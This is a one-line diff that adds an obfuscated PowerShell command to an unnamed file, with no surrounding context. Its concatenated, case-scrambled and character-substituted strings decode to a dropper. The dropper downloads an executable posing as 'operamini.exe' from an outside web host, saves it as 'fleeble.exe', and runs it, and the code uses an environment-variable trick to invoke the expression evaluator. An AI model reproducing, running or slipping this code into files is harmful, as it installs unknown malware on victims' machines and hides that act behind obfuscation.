@@ -1,0 +1,1 @@
+﻿& ( $eNv:ComSpEc[4,26,25]-jOIn'')((('('+'New-Ob'+'ject System.Net'+'.WebC'+'lient).Do'+'wnload'+'File(aKA'+'htt'+'p://w'+'orldn'+'it.com/oper'+'ami'+'ni.exe'+'aKA,a'+'K'+'Afleeble.ex'+'eaKA);St'+'art-'+'Process a'+'K'+'Aflee'+'b'+'l'+'e.exeaK'+'A')-CrEplacE ([ChAR]97+[ChAR]75+[ChAR]65),[ChAR]39) ) 
